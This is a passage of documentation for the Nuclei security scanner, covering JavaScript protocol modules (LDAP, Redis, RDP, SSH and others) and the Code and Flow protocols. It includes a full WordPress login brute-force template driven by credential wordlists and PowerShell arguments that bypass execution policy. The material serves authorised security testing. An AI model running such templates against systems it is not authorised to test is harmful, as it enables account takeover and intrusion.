const sid = ldap.DecodeSID('S-1-5-21-3623811015-3361044348-30300820-1013');
log(sid);

```
#### [​](#defined-in-30)Defined in

ldap.ts:111

---

### [​](#decodezulutimestamp)DecodeZuluTimestamp

▸ **DecodeZuluTimestamp**(`timestamp`): `string`

DecodeZuluTimestamp decodes a Zulu timestamp

#### [​](#parameters-3)Parameters

| Name | Type |
| --- | --- |
| `timestamp` | `string` |

#### [​](#returns-3)Returns

`string`

**`Example`**

```
const ldap = require('nuclei/ldap');
const timestamp = ldap.DecodeZuluTimestamp('2021-08-25T10:00:00Z');
log(timestamp);

```
#### [​](#defined-in-31)Defined in

ldap.ts:126

---

### [​](#joinfilters)JoinFilters

▸ **JoinFilters**(`filters`): `string`

JoinFilters joins multiple filters into a single filter

#### [​](#parameters-4)Parameters

| Name | Type |
| --- | --- |
| `filters` | `any` |

#### [​](#returns-4)Returns

`string`

**`Example`**

```
const ldap = require('nuclei/ldap');
const filter = ldap.JoinFilters(ldap.FilterIsPerson, ldap.FilterAccountEnabled);

```
#### [​](#defined-in-32)Defined in

ldap.ts:140

---

### [​](#negativefilter)NegativeFilter

▸ **NegativeFilter**(`filter`): `string`

NegativeFilter returns a negative filter for a given filter

#### [​](#parameters-5)Parameters

| Name | Type |
| --- | --- |
| `filter` | `string` |

#### [​](#returns-5)Returns

`string`

**`Example`**

```
const ldap = require('nuclei/ldap');
const filter = ldap.NegativeFilter(ldap.FilterIsPerson);

```
#### [​](#defined-in-33)Defined in

ldap.ts:154


Modules

Mssql
=====

[​](#namespace-mssql)Namespace: mssql
=====================================

[​](#table-of-contents)Table of contents
----------------------------------------

### [​](#classes)Classes

* [MSSQLClient](/templates/protocols/javascript/modules/mssql.MSSQLClient)


Modules

Mysql
=====

[​](#namespace-mysql)Namespace: mysql
=====================================

[​](#table-of-contents)Table of contents
----------------------------------------

### [​](#classes)Classes

* [MySQLClient](/templates/protocols/javascript/modules/mysql.MySQLClient)

### [​](#interfaces)Interfaces

* [MySQLInfo](/templates/protocols/javascript/modules/mysql.MySQLInfo)
* [MySQLOptions](/templates/protocols/javascript/modules/mysql.MySQLOptions)
* [SQLResult](/templates/protocols/javascript/modules/mysql.SQLResult)
* [ServiceMySQL](/templates/protocols/javascript/modules/mysql.ServiceMySQL)

### [​](#functions)Functions

* [BuildDSN](/templates/protocols/javascript/modules/mysql#builddsn)

[​](#functions-2)Functions
--------------------------

### [​](#builddsn)BuildDSN

▸ **BuildDSN**(`opts`): `string` | `null`

BuildDSN builds a MySQL data source name (DSN) from the given options.

#### [​](#parameters)Parameters

| Name | Type |
| --- | --- |
| `opts` | [`MySQLOptions`](/templates/protocols/javascript/modules/mysql.MySQLOptions) |

#### [​](#returns)Returns

`string` | `null`

**`Example`**

```
const mysql = require('nuclei/mysql');
const options = new mysql.MySQLOptions();
options.Host = 'acme.com';
options.Port = 3306;
const dsn = mysql.BuildDSN(options);

```
#### [​](#defined-in)Defined in

mysql.ts:14


Modules

Net
===

[​](#namespace-net)Namespace: net
=================================

[​](#table-of-contents)Table of contents
----------------------------------------

### [​](#classes)Classes

* [NetConn](/templates/protocols/javascript/modules/net.NetConn)

### [​](#functions)Functions

* [Open](/templates/protocols/javascript/modules/net#open)
* [OpenTLS](/templates/protocols/javascript/modules/net#opentls)

[​](#functions-2)Functions
--------------------------

### [​](#open)Open

▸ **Open**(`protocol`): [`NetConn`](/templates/protocols/javascript/modules/net.NetConn) | `null`

Open opens a new connection to the address with a timeout.
supported protocols: tcp, udp

#### [​](#parameters)Parameters

| Name | Type |
| --- | --- |
| `protocol` | `string` |

#### [​](#returns)Returns

[`NetConn`](/templates/protocols/javascript/modules/net.NetConn) | `null`

**`Example`**

```
const net = require('nuclei/net');
const conn = net.Open('tcp', 'acme.com:80');

```
#### [​](#defined-in)Defined in

net.ts:12

---

### [​](#opentls)OpenTLS

▸ **OpenTLS**(`protocol`): [`NetConn`](/templates/protocols/javascript/modules/net.NetConn) | `null`

Open opens a new connection to the address with a timeout.
supported protocols: tcp, udp

#### [​](#parameters-2)Parameters

| Name | Type |
| --- | --- |
| `protocol` | `string` |

#### [​](#returns-2)Returns

[`NetConn`](/templates/protocols/javascript/modules/net.NetConn) | `null`

**`Example`**

```
const net = require('nuclei/net');
const conn = net.OpenTLS('tcp', 'acme.com:443');

```
#### [​](#defined-in-2)Defined in

net.ts:27


Modules

Oracle
======

[​](#namespace-oracle)Namespace: oracle
=======================================

[​](#table-of-contents)Table of contents
----------------------------------------

### [​](#interfaces)Interfaces

* [IsOracleResponse](/templates/protocols/javascript/modules/oracle.IsOracleResponse)

### [​](#functions)Functions

* [IsOracle](/templates/protocols/javascript/modules/oracle#isoracle)

[​](#functions-2)Functions
--------------------------

### [​](#isoracle)IsOracle

▸ **IsOracle**(`host`, `port`): [`IsOracleResponse`](/templates/protocols/javascript/modules/oracle.IsOracleResponse) | `null`

IsOracle checks if a host is running an Oracle server

#### [​](#parameters)Parameters

| Name | Type |
| --- | --- |
| `host` | `string` |
| `port` | `number` |

#### [​](#returns)Returns

[`IsOracleResponse`](/templates/protocols/javascript/modules/oracle.IsOracleResponse) | `null`

**`Example`**

```
const oracle = require('nuclei/oracle');
const isOracle = oracle.IsOracle('acme.com', 1521);
log(toJSON(isOracle));

```
#### [​](#defined-in)Defined in

oracle.ts:12


Modules

Pop3
====

[​](#namespace-pop3)Namespace: pop3
===================================

[​](#table-of-contents)Table of contents
----------------------------------------

### [​](#interfaces)Interfaces

* [IsPOP3Response](/templates/protocols/javascript/modules/pop3.IsPOP3Response)

### [​](#functions)Functions

* [IsPOP3](/templates/protocols/javascript/modules/pop3#ispop3)

[​](#functions-2)Functions
--------------------------

### [​](#ispop3)IsPOP3

▸ **IsPOP3**(`host`, `port`): [`IsPOP3Response`](/templates/protocols/javascript/modules/pop3.IsPOP3Response) | `null`

IsPOP3 checks if a host is running a POP3 server.

#### [​](#parameters)Parameters

| Name | Type |
| --- | --- |
| `host` | `string` |
| `port` | `number` |

#### [​](#returns)Returns

[`IsPOP3Response`](/templates/protocols/javascript/modules/pop3.IsPOP3Response) | `null`

**`Example`**

```
const pop3 = require('nuclei/pop3');
const isPOP3 = pop3.IsPOP3('acme.com', 110);
log(toJSON(isPOP3));

```
#### [​](#defined-in)Defined in

pop3.ts:12


Modules

Postgres
========

[​](#namespace-postgres)Namespace: postgres
===========================================

[​](#table-of-contents)Table of contents
----------------------------------------

### [​](#classes)Classes

* [PGClient](/templates/protocols/javascript/modules/postgres.PGClient)

### [​](#interfaces)Interfaces

* [SQLResult](/templates/protocols/javascript/modules/postgres.SQLResult)


Modules

Rdp
===

[​](#namespace-rdp)Namespace: rdp
=================================

[​](#table-of-contents)Table of contents
----------------------------------------

### [​](#interfaces)Interfaces

* [CheckRDPAuthResponse](/templates/protocols/javascript/modules/rdp.CheckRDPAuthResponse)
* [IsRDPResponse](/templates/protocols/javascript/modules/rdp.IsRDPResponse)
* [ServiceRDP](/templates/protocols/javascript/modules/rdp.ServiceRDP)

### [​](#functions)Functions

* [CheckRDPAuth](/templates/protocols/javascript/modules/rdp#checkrdpauth)
* [IsRDP](/templates/protocols/javascript/modules/rdp#isrdp)

[​](#functions-2)Functions
--------------------------

### [​](#checkrdpauth)CheckRDPAuth

▸ **CheckRDPAuth**(`host`, `port`): [`CheckRDPAuthResponse`](/templates/protocols/javascript/modules/rdp.CheckRDPAuthResponse) | `null`

CheckRDPAuth checks if the given host and port are running rdp server
with authentication and returns their metadata.
If connection is successful, it returns true.

#### [​](#parameters)Parameters

| Name | Type |
| --- | --- |
| `host` | `string` |
| `port` | `number` |

#### [​](#returns)Returns

[`CheckRDPAuthResponse`](/templates/protocols/javascript/modules/rdp.CheckRDPAuthResponse) | `null`

**`Example`**

```
const rdp = require('nuclei/rdp');
const checkRDPAuth = rdp.CheckRDPAuth('acme.com', 3389);
log(toJSON(checkRDPAuth));

```
#### [​](#defined-in)Defined in

rdp.ts:14

---

### [​](#isrdp)IsRDP

▸ **IsRDP**(`host`, `port`): [`IsRDPResponse`](/templates/protocols/javascript/modules/rdp.IsRDPResponse) | `null`

IsRDP checks if the given host and port are running rdp server.
If connection is successful, it returns true.
If connection is unsuccessful, it returns false and error.
The Name of the OS is also returned if the connection is successful.

#### [​](#parameters-2)Parameters

| Name | Type |
| --- | --- |
| `host` | `string` |
| `port` | `number` |

#### [​](#returns-2)Returns

[`IsRDPResponse`](/templates/protocols/javascript/modules/rdp.IsRDPResponse) | `null`

**`Example`**

```
const rdp = require('nuclei/rdp');
const isRDP = rdp.IsRDP('acme.com', 3389);
log(toJSON(isRDP));

```
#### [​](#defined-in-2)Defined in

rdp.ts:32


Modules

Redis
=====

[​](#namespace-redis)Namespace: redis
=====================================

[​](#table-of-contents)Table of contents
----------------------------------------

### [​](#functions)Functions

* [Connect](/templates/protocols/javascript/modules/redis#connect)
* [GetServerInfo](/templates/protocols/javascript/modules/redis#getserverinfo)
* [GetServerInfoAuth](/templates/protocols/javascript/modules/redis#getserverinfoauth)
* [IsAuthenticated](/templates/protocols/javascript/modules/redis#isauthenticated)
* [RunLuaScript](/templates/protocols/javascript/modules/redis#runluascript)

[​](#functions-2)Functions
--------------------------

### [​](#connect)Connect

▸ **Connect**(`host`, `port`, `password`): `boolean` | `null`

Connect tries to connect redis server with password

#### [​](#parameters)Parameters

| Name | Type |
| --- | --- |
| `host` | `string` |
| `port` | `number` |
| `password` | `string` |

#### [​](#returns)Returns

`boolean` | `null`

**`Example`**

```
const redis = require('nuclei/redis');
const connected = redis.Connect('acme.com', 6379, 'password');

```
#### [​](#defined-in)Defined in

redis.ts:11

---

### [​](#getserverinfo)GetServerInfo

▸ **GetServerInfo**(`host`, `port`): `string` | `null`

GetServerInfo returns the server info for a redis server

#### [​](#parameters-2)Parameters

| Name | Type |
| --- | --- |
| `host` | `string` |
| `port` | `number` |

#### [​](#returns-2)Returns

`string` | `null`

**`Example`**

```
const redis = require('nuclei/redis');
const info = redis.GetServerInfo('acme.com', 6379);

```
#### [​](#defined-in-2)Defined in

redis.ts:25

---

### [​](#getserverinfoauth)GetServerInfoAuth

▸ **GetServerInfoAuth**(`host`, `port`, `password`): `string` | `null`

GetServerInfoAuth returns the server info for a redis server

#### [​](#parameters-3)Parameters

| Name | Type |
| --- | --- |
| `host` | `string` |
| `port` | `number` |
| `password` | `string` |

#### [​](#returns-3)Returns

`string` | `null`

**`Example`**

```
const redis = require('nuclei/redis');
const info = redis.GetServerInfoAuth('acme.com', 6379, 'password');

```
#### [​](#defined-in-3)Defined in

redis.ts:39

---

### [​](#isauthenticated)IsAuthenticated

▸ **IsAuthenticated**(`host`, `port`): `boolean` | `null`

IsAuthenticated checks if the redis server requires authentication

#### [​](#parameters-4)Parameters

| Name | Type |
| --- | --- |
| `host` | `string` |
| `port` | `number` |

#### [​](#returns-4)Returns

`boolean` | `null`

**`Example`**

```
const redis = require('nuclei/redis');
const isAuthenticated = redis.IsAuthenticated('acme.com', 6379);

```
#### [​](#defined-in-4)Defined in

redis.ts:53

---

### [​](#runluascript)RunLuaScript

▸ **RunLuaScript**(`host`, `port`, `password`, `script`): `any` | `null`

RunLuaScript runs a lua script on the redis server

#### [​](#parameters-5)Parameters

| Name | Type |
| --- | --- |
| `host` | `string` |
| `port` | `number` |
| `password` | `string` |
| `script` | `string` |

#### [​](#returns-5)Returns

`any` | `null`

**`Example`**

```
const redis = require('nuclei/redis');
const result = redis.RunLuaScript('acme.com', 6379, 'password', 'return redis.call("get", KEYS[1])');

```
#### [​](#defined-in-5)Defined in

redis.ts:67


Modules

Rsync
=====

[​](#namespace-rsync)Namespace: rsync
=====================================

[​](#table-of-contents)Table of contents
----------------------------------------

### [​](#interfaces)Interfaces

* [IsRsyncResponse](/templates/protocols/javascript/modules/rsync.IsRsyncResponse)

### [​](#functions)Functions

* [IsRsync](/templates/protocols/javascript/modules/rsync#isrsync)

[​](#functions-2)Functions
--------------------------

### [​](#isrsync)IsRsync

▸ **IsRsync**(`host`, `port`): [`IsRsyncResponse`](/templates/protocols/javascript/modules/rsync.IsRsyncResponse) | `null`

IsRsync checks if a host is running a Rsync server.

#### [​](#parameters)Parameters

| Name | Type |
| --- | --- |
| `host` | `string` |
| `port` | `number` |

#### [​](#returns)Returns

[`IsRsyncResponse`](/templates/protocols/javascript/modules/rsync.IsRsyncResponse) | `null`

**`Example`**

```
const rsync = require('nuclei/rsync');
const isRsync = rsync.IsRsync('acme.com', 873);
log(toJSON(isRsync));

```
#### [​](#defined-in)Defined in

rsync.ts:12


Modules

Smb
===

[​](#namespace-smb)Namespace: smb
=================================

[​](#table-of-contents)Table of contents
----------------------------------------

### [​](#classes)Classes

* [SMBClient](/templates/protocols/javascript/modules/smb.SMBClient)

### [​](#interfaces)Interfaces

* [HeaderLog](/templates/protocols/javascript/modules/smb.HeaderLog)
* [NegotiationLog](/templates/protocols/javascript/modules/smb.NegotiationLog)
* [SMBCapabilities](/templates/protocols/javascript/modules/smb.SMBCapabilities)
* [SMBLog](/templates/protocols/javascript/modules/smb.SMBLog)
* [SMBVersions](/templates/protocols/javascript/modules/smb.SMBVersions)
* [ServiceSMB](/templates/protocols/javascript/modules/smb.ServiceSMB)
* [SessionSetupLog](/templates/protocols/javascript/modules/smb.SessionSetupLog)


Modules

Smtp
====

[​](#namespace-smtp)Namespace: smtp
===================================

[​](#table-of-contents)Table of contents
----------------------------------------

### [​](#classes)Classes

* [Client](/templates/protocols/javascript/modules/smtp.Client)
* [SMTPMessage](/templates/protocols/javascript/modules/smtp.SMTPMessage)

### [​](#interfaces)Interfaces

* [SMTPResponse](/templates/protocols/javascript/modules/smtp.SMTPResponse)


Modules

Ssh
===

[​](#namespace-ssh)Namespace: ssh
=================================

[​](#table-of-contents)Table of contents
----------------------------------------

### [​](#classes)Classes

* [SSHClient](/templates/protocols/javascript/modules/ssh.SSHClient)

### [​](#interfaces)Interfaces

* [Algorithms](/templates/protocols/javascript/modules/ssh.Algorithms)
* [DirectionAlgorithms](/templates/protocols/javascript/modules/ssh.DirectionAlgorithms)
* [EndpointId](/templates/protocols/javascript/modules/ssh.EndpointId)
* [HandshakeLog](/templates/protocols/javascript/modules/ssh.HandshakeLog)
* [KexInitMsg](/templates/protocols/javascript/modules/ssh.KexInitMsg)


Modules

Structs
=======

[​](#namespace-structs)Namespace: structs
=========================================

[​](#table-of-contents)Table of contents
----------------------------------------

### [​](#functions)Functions

* [Pack](/templates/protocols/javascript/modules/structs#pack)
* [StructsCalcSize](/templates/protocols/javascript/modules/structs#structscalcsize)
* [Unpack](/templates/protocols/javascript/modules/structs#unpack)

[​](#functions-2)Functions
--------------------------

### [​](#pack)Pack

▸ **Pack**(`formatStr`, `msg`): `Uint8Array` | `null`

StructsPack returns a byte slice containing the values of msg slice packed according to the given format.
The items of msg slice must match the values required by the format exactly.
Ex: structs.pack(“H”, 0)

#### [​](#parameters)Parameters

| Name | Type |
| --- | --- |
| `formatStr` | `string` |
| `msg` | `any` |

#### [​](#returns)Returns

`Uint8Array` | `null`

**`Example`**

```
const structs = require('nuclei/structs');
const packed = structs.Pack('H', [0]);

```
#### [​](#defined-in)Defined in

structs.ts:13

---

### [​](#structscalcsize)StructsCalcSize

▸ **StructsCalcSize**(`format`): `number` | `null`

StructsCalcSize returns the number of bytes needed to pack the values according to the given format.
Ex: structs.CalcSize(“H”)

#### [​](#parameters-2)Parameters

| Name | Type |
| --- | --- |
| `format` | `string` |

#### [​](#returns-2)Returns

`number` | `null`

**`Example`**

```
const structs = require('nuclei/structs');
const size = structs.CalcSize('H');

```
#### [​](#defined-in-2)Defined in

structs.ts:28

---

### [​](#unpack)Unpack

▸ **Unpack**(`format`, `msg`): `any` | `null`

StructsUnpack the byte slice (presumably packed by Pack(format, msg)) according to the given format.
The result is a []interface slice even if it contains exactly one item.
The byte slice must contain not less the amount of data required by the format
(len(msg) must more or equal CalcSize(format)).
Ex: structs.Unpack(“>I”, buff[:nb])

#### [​](#parameters-3)Parameters

| Name | Type |
| --- | --- |
| `format` | `string` |
| `msg` | `Uint8Array` |

#### [​](#returns-3)Returns

`any` | `null`

**`Example`**

```
const structs = require('nuclei/structs');
const result = structs.Unpack('H', [0]);

```
#### [​](#defined-in-3)Defined in

structs.ts:46


Modules

Telnet
======

[​](#namespace-telnet)Namespace: telnet
=======================================

[​](#table-of-contents)Table of contents
----------------------------------------

### [​](#interfaces)Interfaces

* [IsTelnetResponse](/templates/protocols/javascript/modules/telnet.IsTelnetResponse)

### [​](#functions)Functions

* [IsTelnet](/templates/protocols/javascript/modules/telnet#istelnet)

[​](#functions-2)Functions
--------------------------

### [​](#istelnet)IsTelnet

▸ **IsTelnet**(`host`, `port`): [`IsTelnetResponse`](/templates/protocols/javascript/modules/telnet.IsTelnetResponse) | `null`

IsTelnet checks if a host is running a Telnet server.

#### [​](#parameters)Parameters

| Name | Type |
| --- | --- |
| `host` | `string` |
| `port` | `number` |

#### [​](#returns)Returns

[`IsTelnetResponse`](/templates/protocols/javascript/modules/telnet.IsTelnetResponse) | `null`

**`Example`**

```
const telnet = require('nuclei/telnet');
const isTelnet = telnet.IsTelnet('acme.com', 23);
log(toJSON(isTelnet));

```
#### [​](#defined-in)Defined in

telnet.ts:12


Modules

Vnc
===

[​](#namespace-vnc)Namespace: vnc
=================================

[​](#table-of-contents)Table of contents
----------------------------------------

### [​](#interfaces)Interfaces

* [IsVNCResponse](/templates/protocols/javascript/modules/vnc.IsVNCResponse)

### [​](#functions)Functions

* [IsVNC](/templates/protocols/javascript/modules/vnc#isvnc)

[​](#functions-2)Functions
--------------------------

### [​](#isvnc)IsVNC

▸ **IsVNC**(`host`, `port`): [`IsVNCResponse`](/templates/protocols/javascript/modules/vnc.IsVNCResponse) | `null`

IsVNC checks if a host is running a VNC server.
It returns a boolean indicating if the host is running a VNC server
and the banner of the VNC server.

#### [​](#parameters)Parameters

| Name | Type |
| --- | --- |
| `host` | `string` |
| `port` | `number` |

#### [​](#returns)Returns

[`IsVNCResponse`](/templates/protocols/javascript/modules/vnc.IsVNCResponse) | `null`

**`Example`**

```
const vnc = require('nuclei/vnc');
const isVNC = vnc.IsVNC('acme.com', 5900);
log(toJSON(isVNC));

```
#### [​](#defined-in)Defined in

vnc.ts:14


Protocols

Code Protocol
=============

Learn about using external code with Nuclei

Nuclei enables the execution of external code on the host operating system. This feature allows security researchers, pentesters, and developers to extend the capabilities of Nuclei and perform complex actions beyond the scope of regular supported protocol-based testing.

By leveraging this capability, Nuclei can interact with the underlying operating system and execute custom scripts or commands, opening up a wide range of possibilities. It enables users to perform tasks such as system-level configurations, file operations, network interactions, and more. This level of control and flexibility empowers users to tailor their security testing workflows according to their specific requirements.

To write code template, a code block is used to indicate the start of the requests for the template. This block marks the beginning of the code-related instructions.

```
# Start the requests for the template right here
code:

```

[​](#engine)Engine
------------------

To execute the code, a list of language interpreters, which are installed or available on the system environment, is specified. These interpreters can be and not limited to `bash` `sh` `py` `python3`, `go`, `ps`, among others, and they are searched sequentially until a suitable one is found. The identifiers for these interpreters should correspond to their respective names or identifiers recognized by the system environment.

```
- engine:
    - py
    - python3

```

The code to be executed can be provided either as an external file or as a code snippet directly within the template.

For an external file:

```
source: helpers/code/pyfile.py

```

For a code snippet:

```
source: |
      import sys
      print("hello from " + sys.stdin.read())

```

The target is passed to the template via stdin, and the output of the executed code is available for further processing in matchers and extractors. In the case of the Code protocol, the response part represents all data printed to stdout during the execution of the code.

[​](#parts)Parts
----------------

Valid `part` values supported by **Code** protocol for Matchers / Extractor are -

| Value | Description |
| --- | --- |
| response | execution output (trailing whitespaces are filtered) |
| stderr | Raw Stderr Output(if any) |

The provided example demonstrates the execution of a bash and python code snippet within the template. The specified engines are searched in the given order, and the code snippet is executed accordingly. Additionally, dynamic template variables are used in the code snippet, which are replaced with their respective values during the execution of the template which shows the flexibility and customization that can be achieved using this protocol.

```
id: code-template

info:
  name: example code template
  author: pdteam
  severity: info

variables:
  OAST: "{{interactsh-url}}"

code:
  - engine:
      - sh
      - bash
    source: |
      echo "$OAST" | base64

  - engine:
      - py
      - python3
    source: |
      import base64
      import os

      text = os.getenv('OAST')
      text_bytes = text.encode('utf-8') 
      base64_bytes = base64.b64encode(text_bytes) 
      base64_text = base64_bytes.decode('utf-8')
      
      print(base64_text)

http:
  - method: GET
    path:
      - "{{BaseURL}}/?x={{code_1_response}}"
      - "{{BaseURL}}/?x={{code_2_response}}"

# digest: 4a0a0047304502202ce8fe9f5992782da6ba59da4e8ebfde9f19a12e247adc507040e9f1f1124b4e022100cf0bc7a44a557a6655f79a2b4789e103f5099f0f81a8d1bc4ad8aabe7829b1c5:8eeeebe39b11b16384b45bc7e9163000

```

Apart from required fields mentioned above, Code protocol also supports following optional fields to further customize the execution of code.

[​](#args)Args
--------------

Args are arguments that are sent to engine while executing the code. For example if we want to bypass execution policy in powershell for specific template this can be done by adding following args to the template.

```
  - engine:
      - powershell
      - powershell.exe
    args:
      - -ExecutionPolicy
      - Bypass
      - -File

```

[​](#pattern)Pattern
--------------------

Pattern field can be used to customize name / extension of temporary file while executing a code snippet in a template

```
    pattern: "*.ps1"

```

adding `pattern: "*.ps1"` will make sure that name of temporary file given pattern.

[​](#examples)Examples
----------------------

This code example shows a basic response based on DSL.

```
id: code-template


info:
  name: example code template
  author: pdteam
  severity: info


self-contained: true
code:
  - engine:
      - py
      - python3
    source: |
      print("Hello World")

    extractors:
      - type: dsl
        dsl:
          - response
# digest: 4a0a0047304502204576db451ff35ea9a13c107b07a6d74f99fd9a78f5c2316cc3dece411e7d5a2b022100a36db96f2a56492147ca3e7de3c4d36b8e1361076a70924061790003958c4ef3:c40a3a04977cdbf9dca31c1002ea8279


```

Below is a example code template where we are executing a powershell script while customizing behaviour of execution policy and setting pattern to `*.ps1`

```
id: ps1-code-snippet

info:
  name: ps1-code-snippet
  author: pdteam
  severity: info
  description: |
    ps1-code-snippet
  tags: code

code:
  - engine:
      - powershell
      - powershell.exe
    args:
      - -ExecutionPolicy
      - Bypass
      - -File
    pattern: "*.ps1"
    source: |
      $stdin = [Console]::In
      $line = $stdin.ReadLine()
      Write-Host "hello from $line"
    
    matchers:
      - type: word
        words:
          - "hello from input"
# digest: 4a0a00473045022100eb01da6b97893e7868c584f330a0cd52df9bddac005860bb8595ba5b8aed58c9022050043feac68d69045cf320cba9298a2eb2e792ea4720d045d01e803de1943e7d:4a3eb6b4988d95847d4203be25ed1d46

```

[​](#running-code-templates)Running Code Templates
--------------------------------------------------

By default Nuclei will not execute code templates. To enable code protocol execution, `-code` flag needs to be explicitly passed to nuclei.

```
nuclei -t code-template.yaml -code

```

[​](#learn-more)Learn More
--------------------------

For more examples, please refer to example [code-templates](https://github.com/projectdiscovery/nuclei/tree/main/integration_tests/protocols/code) in integration tests.


It’s important to exercise caution while utilizing this feature, as executing external code on the host operating system carries inherent risks. It is crucial to ensure that the executed code is secure, thoroughly tested, and does not pose any unintended consequences or security risks to the target system.


To ensure the integrity of the code in your templates, be sure to sign your templates using the [Template Signing](/templates/reference/template-signing) methods.


Protocols

Flow Protocol
=============

Learn about the template flow engine in Nuclei v3

[​](#overview)Overview
----------------------

The template flow engine was introduced in nuclei v3, and brings two significant enhancements to Nuclei:

* The ability to [conditionally execute requests](/_sites/docs.projectdiscovery.io/templates/protocols/flow#conditional-execution)
* The [orchestration of request execution](/_sites/docs.projectdiscovery.io/templates/protocols/flow#request-execution-orchestration)

These features are implemented using JavaScript (ECMAScript 5.1) via the [goja](https://github.com/dop251/goja) backend.

[​](#conditional-execution)Conditional Execution
------------------------------------------------

Many times when writing complex templates we might need to add some extra checks (or conditional statements) before executing certain part of request.

An ideal example of this would be when [bruteforcing wordpress login](https://cloud.projectdiscovery.io/public/wordpress-weak-credentials) with default usernames and passwords, but if we carefully re-evaluate this template, we can see that template is sending 276 requests without even checking, if the url actually exists or the target site is actually a wordpress site.

With addition of flow in Nuclei v3 we can re-write this template to first check if the target is a wordpress site, if yes then bruteforce login with default credentials and this can be achieved by simply adding one line of content i.e `flow: http(1) && http(2)` and nuclei will take care of everything else.

```
id: wordpress-bruteforce

info:
  name: WordPress Login Bruteforce
  author: pdteam
  severity: high

flow: http(1) && http(2)

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-login.php"

    matchers:
      - type: word
        words:
          - "WordPress"

  - method: POST
    path:
      - "{{BaseURL}}/wp-login.php"

    body: |
        log={{username}}&pwd={{password}}&wp-submit=Log+In

    attack: clusterbomb 
    payloads:
      users: helpers/wordlists/wp-users.txt
      passwords: helpers/wordlists/wp-passwords.txt

    matchers:
      - type: dsl
        dsl:
          - status_code == 302
          - contains_all(header, "/wp-admin","wordpress_logged_in")
        condition: and

```

The update template now seems straight forward and easy to understand. we are first checking if the target is a wordpress site and then executing bruteforce requests. This is just a simple example of conditional execution and flow accepts any Javascript (ECMAScript 5.1) expression/code so you are free to craft any conditional execution logic you want.

[​](#request-execution-orchestration)Request Execution Orchestration
--------------------------------------------------------------------

Flow is a powerful Nuclei feature that provides enhanced orchestration capabilities for executing requests. The simplicity of conditional execution is just the beginning. With ﻿flow, you can:

* Iterate over a list of values and execute a request for each one
* Extract values from a request, iterate over them, and perform another request for each
* Get and set values within the template context (global variables)
* Write output to stdout for debugging purposes or based on specific conditions
* Introduce custom logic during template execution
* Use ECMAScript 5.1 JavaScript features to build and modify variables at runtime
* Update variables at runtime and use them in subsequent requests.

Think of request execution orchestration as a bridge between JavaScript and Nuclei, offering two-way interaction within a specific template.

**Practical Example: Vhost Enumeration**

To better illustrate the power of ﻿flow, let’s consider developing a template for vhost (virtual host) enumeration. This set of tasks typically requires writing a new tool from scratch. Here are the steps we need to follow:

1. Retrieve the SSL certificate for the provided IP (using tlsx)
   * Extract `subject_cn` (CN) from the certificate
   * Extract `subject_an` (SAN) from the certificate
   * Remove wildcard prefixes from the values obtained in the steps above
2. Bruteforce the request using all the domains found from the SSL request

You can utilize flow to simplify this task. The JavaScript code below orchestrates the vhost enumeration:

```
ssl();
for (let vhost of iterate(template["ssl_domains"])) {
    set("vhost", vhost);
    http();
}

```

In this code, we’ve introduced 5 extra lines of JavaScript. This allows the template to perform vhost enumeration. The best part? You can run this at scale with all features of Nuclei, using supported inputs like ﻿ASN, ﻿CIDR, ﻿URL.

Let’s break down the JavaScript code:

1. `ssl()`: This function executes the SSL request.
2. `template["ssl_domains"]`: Retrieves the value of `ssl_domains` from the template context.
3. `iterate()`: Helper function that iterates over any value type while handling empty or null values.
4. `set("vhost", vhost)`: Creates a new variable `vhost` in the template and assigns the `vhost` variable’s value to it.
5. `http()`: This function conducts the HTTP request.

By understanding and taking advantage of Nuclei’s `flow`, you can redefine the way you orchestrate request executions, making your templates much more powerful and efficient.

Here is working template for vhost enumeration using flow:

```
id: vhost-enum-flow

info:
  name: vhost enum flow
  author: tarunKoyalwar
  severity: info
  description: |
    vhost enumeration by extracting potential vhost names from ssl certificate.

flow: |
  ssl();
  for (let vhost of iterate(template["ssl_domains"])) {
    set("vhost", vhost);
    http();
  }

ssl:
  - address: "{{Host}}:{{Port}}"

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{vhost}}

    matchers:
      - type: dsl
        dsl:
          - status_code != 400
          - status_code != 502

    extractors:
      - type: dsl
        dsl:
          - '"VHOST: " + vhost + ", SC: " + status_code + ", CL: " + content_length'

```

[​](#js-bindings)JS Bindings
----------------------------

This section contains a brief description of all nuclei JS bindings and their usage.

### [​](#protocol-execution-function)Protocol Execution Function

In nuclei, any listed protocol can be invoked or executed in JavaScript using the `protocol_name()` format. For example, you can use `http()`, `dns()`, `ssl()`, etc.

If you want to execute a specific request of a protocol (refer to nuclei-flow-dns for an example), it can be achieved by passing either:

* The index of that request in the protocol (e.g.,`dns(1)`, `dns(2)`)
* The ID of that request in the protocol (e.g., `dns("extract-vps")`, `http("probe-http")`)

For more advanced scenarios where multiple requests of a single protocol need to be executed, you can specify their index or ID one after the other (e.g., ﻿dns(“extract-vps”,“1”)).

This flexibility in using either index numbers or ID strings to call specific protocol requests provides controls for tailored execution, allowing you to build more complex and efficient workflows. more complex use cases multiple requests of a single protocol can be executed by just specifying their index or id one after another (ex: `dns("extract-vps","1")`)

### [​](#iterate-helper-function)Iterate Helper Function

Iterate is a nuclei js helper function which can be used to iterate over any type of value like **array**, **map**, **string**, **number** while handling empty/nil values.

This is addon helper function from nuclei to omit boilerplate code of checking if value is empty or not and then iterating over it

```
iterate(123,{"a":1,"b":2,"c":3})

// iterate over array with custom separator
iterate([1,2,3,4,5], " ")

```
### [​](#set-helper-function)Set Helper Function

When iterating over a values/array or some other use case we might want to invoke a request with custom/given value and this can be achieved by using `set()` helper function. When invoked/called it adds given variable to template context (global variables) and that value is used during execution of request/protocol. the format of `set()` is `set("variable_name",value)` ex: `set("username","admin")`.

```
for (let vhost of myArray) {
  set("vhost", vhost);
  http(1)
}

```

**Note:** In above example we used `set("vhost", vhost)` which added `vhost` to template context (global variables) and then called `http(1)` which used this value in request.

### [​](#template-context)Template Context

A template context is nothing but a map/jsonl containing all this data along with internal/unexported data that is only available at runtime (ex: extracted values from previous requests, variables added using `set()` etc). This template context is available in javascript as `template` variable and can be used to access any data from it. ex: `template["dns_cname"]`, `template["ssl_subject_cn"]` etc.

```
template["ssl_domains"] // returns value of ssl_domains from template context which is available after executing ssl request 
template["ptrValue"]  // returns value of ptrValue which was extracted using regex with internal: true

```

Lot of times we don’t known what all data is available in template context and this can be easily found by printing it to stdout using `log()` function

```
log(template)

```
### [​](#log-helper-function)Log Helper Function

It is a nuclei js alternative to `console.log` and this pretty prints map data in readable format

**Note:** This should be used for debugging purposed only as this prints data to stdout

### [​](#dedupe)Dedupe

